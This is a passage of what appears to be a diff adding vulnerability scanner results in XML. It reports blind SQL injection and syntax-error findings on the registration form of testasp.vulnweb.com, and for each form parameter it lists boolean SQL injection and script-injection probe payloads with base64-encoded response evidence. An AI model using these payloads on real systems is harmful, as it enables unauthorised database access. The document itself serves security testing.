+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvbnRlbnQuCgpDb250ZW50IG9mIGFsbCBUUlVFIHJlc3BvbnNlcyBkaWZmZXIgZnJvbSBGQUxTRSByZXNwb25zZXMuCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJyUyME9SJTIwJ3QnJTNEJ3QmdGZSTmFtZT1Kb2huJnRmRW1haWw9d2FzQHF1YWx5cy5jb20mdGZVUGFzcz1wYXNzd29yZAoKRmFsc2UgY29uZGl0aW9uOgoKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vUmVnaXN0ZXIuYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgoKQk9EWQp0ZlVOYW1lPUpvaG4nJTIwQU5EJTIwJ3gnJTNEJ3QmdGZSTmFtZT1Kb2huJnRmRW1haWw9d2FzQHF1YWx5cy5jb20mdGZVUGFzcz1wYXNzd29yZA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John'%20OR%203%3D3--%20&tfRName=John&tfEmail=was@qualys.com&tfUPass=password]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvbnRlbnQuCgpDb250ZW50IG9mIGFsbCBUUlVFIHJlc3BvbnNlcyBkaWZmZXIgZnJvbSBGQUxTRSByZXNwb25zZXMuCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJyUyME9SJTIwMyUzRDMtLSUyMCZ0ZlJOYW1lPUpvaG4mdGZFbWFpbD13YXNAcXVhbHlzLmNvbSZ0ZlVQYXNzPXBhc3N3b3JkCgpGYWxzZSBjb25kaXRpb246CgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9SZWdpc3Rlci5hc3A_UmV0VVJMPSUyRkRlZmF1bHQuYXNwJTNGCgpCT0RZCnRmVU5hbWU9Sm9obiclMjBBTkQlMjAzJTNENC0tJTIwJnRmUk5hbWU9Sm9obiZ0ZkVtYWlsPXdhc0BxdWFseXMuY29tJnRmVVBhc3M9cGFzc3dvcmQ]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150012</qid>
+        <title><![CDATA[Blind SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfRName</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>2</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfRName=John'%20OR%20't'%3D't&tfEmail=was@qualys.com&tfUPass=password]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvbnRlbnQuCgpDb250ZW50IG9mIGFsbCBUUlVFIHJlc3BvbnNlcyBkaWZmZXIgZnJvbSBGQUxTRSByZXNwb25zZXMuCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJnRmUk5hbWU9Sm9obiclMjBPUiUyMCd0JyUzRCd0JnRmRW1haWw9d2FzQHF1YWx5cy5jb20mdGZVUGFzcz1wYXNzd29yZAoKRmFsc2UgY29uZGl0aW9uOgoKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vUmVnaXN0ZXIuYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgoKQk9EWQp0ZlVOYW1lPUpvaG4mdGZSTmFtZT1Kb2huJyUyMEFORCUyMCd4JyUzRCd0JnRmRW1haWw9d2FzQHF1YWx5cy5jb20mdGZVUGFzcz1wYXNzd29yZA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfRName=John'%20OR%203%3D3--%20&tfEmail=was@qualys.com&tfUPass=password]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvbnRlbnQuCgpDb250ZW50IG9mIGFsbCBUUlVFIHJlc3BvbnNlcyBkaWZmZXIgZnJvbSBGQUxTRSByZXNwb25zZXMuCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJnRmUk5hbWU9Sm9obiclMjBPUiUyMDMlM0QzLS0lMjAmdGZFbWFpbD13YXNAcXVhbHlzLmNvbSZ0ZlVQYXNzPXBhc3N3b3JkCgpGYWxzZSBjb25kaXRpb246CgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9SZWdpc3Rlci5hc3A_UmV0VVJMPSUyRkRlZmF1bHQuYXNwJTNGCgpCT0RZCnRmVU5hbWU9Sm9obiZ0ZlJOYW1lPUpvaG4nJTIwQU5EJTIwMyUzRDQtLSUyMCZ0ZkVtYWlsPXdhc0BxdWFseXMuY29tJnRmVVBhc3M9cGFzc3dvcmQ]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150012</qid>
+        <title><![CDATA[Blind SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfUPass</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>2</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfRName=John&tfEmail=was@qualys.com&tfUPass=password'%20OR%20't'%3D't]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvbnRlbnQuCgpDb250ZW50IG9mIGFsbCBUUlVFIHJlc3BvbnNlcyBkaWZmZXIgZnJvbSBGQUxTRSByZXNwb25zZXMuCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJnRmUk5hbWU9Sm9obiZ0ZkVtYWlsPXdhc0BxdWFseXMuY29tJnRmVVBhc3M9cGFzc3dvcmQnJTIwT1IlMjAndCclM0QndAoKRmFsc2UgY29uZGl0aW9uOgoKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vUmVnaXN0ZXIuYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgoKQk9EWQp0ZlVOYW1lPUpvaG4mdGZSTmFtZT1Kb2huJnRmRW1haWw9d2FzQHF1YWx5cy5jb20mdGZVUGFzcz1wYXNzd29yZCclMjBBTkQlMjAneCclM0QndA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfRName=John&tfEmail=was@qualys.com&tfUPass=password'%20OR%203%3D3--%20]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvbnRlbnQuCgpDb250ZW50IG9mIGFsbCBUUlVFIHJlc3BvbnNlcyBkaWZmZXIgZnJvbSBGQUxTRSByZXNwb25zZXMuCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJnRmUk5hbWU9Sm9obiZ0ZkVtYWlsPXdhc0BxdWFseXMuY29tJnRmVVBhc3M9cGFzc3dvcmQnJTIwT1IlMjAzJTNEMy0tJTIwCgpGYWxzZSBjb25kaXRpb246CgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9SZWdpc3Rlci5hc3A_UmV0VVJMPSUyRkRlZmF1bHQuYXNwJTNGCgpCT0RZCnRmVU5hbWU9Sm9obiZ0ZlJOYW1lPUpvaG4mdGZFbWFpbD13YXNAcXVhbHlzLmNvbSZ0ZlVQYXNzPXBhc3N3b3JkJyUyMEFORCUyMDMlM0Q0LS0lMjA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150022</qid>
+        <title><![CDATA[Syntax Error Occurred]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfUPass</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L1JlZ2lzdGVyLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxNCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[z--><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[*/;(function()%7bqxss%7d);/*]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss%20%60%3b!--=%26%7b()%7d>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L1JlZ2lzdGVyLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxNCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150022</qid>
+        <title><![CDATA[Syntax Error Occurred]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfEmail</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss%20%60%3b!--=%26%7b()%7d>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L1JlZ2lzdGVyLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxNCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[z--><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[*/;(function()%7bqxss%7d);/*]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L1JlZ2lzdGVyLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxNCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150022</qid>
+        <title><![CDATA[Syntax Error Occurred]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfRName</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>5</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss%20%60%3b!--=%26%7b()%7d>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L1JlZ2lzdGVyLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxNCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[z--><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMmYnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtWaW9sYXRpb24gb2YgUFJJTUFSWSBLRVkgY29uc3RyYWludCAndXNlcnMkUHJpbWFyeUtleScuIENhbm5vdCBpbnNlcnQgZHVwbGljYXRlIGtleSBpbiBvYmplY3QgJ2Riby51c2VycycuJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDsvUmVnaXN0ZXIuYXNwJmx0Oy9mb250Jmd0OyZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7LCBsaW5lIDE0Jmx0Oy9mb250Jmd0OyA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss>]]></payload>
